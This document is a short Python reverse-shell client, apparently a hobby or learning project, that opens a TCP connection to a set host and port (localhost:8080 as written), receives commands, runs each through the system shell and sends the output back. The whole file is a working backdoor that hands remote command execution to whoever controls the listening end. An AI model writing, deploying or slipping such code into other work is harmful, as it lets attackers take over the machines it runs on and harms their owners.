from ctypes.wintypes import INT
import socket
import subprocess

# Setting up IP and Sockets
REMOTE_HOST = "localhost"
REMOTE_PORT = 8080  # 2222
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Initializing connetion
print("[-] Initiating connection ...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated")

while True:
    print("[-] Awaiting commands ...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(
        command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE
    )
    output = op.stdout.read()
    output_error = op.stderr.read()

    print("[-] Sending response ...")
    client.send(output + output_error)
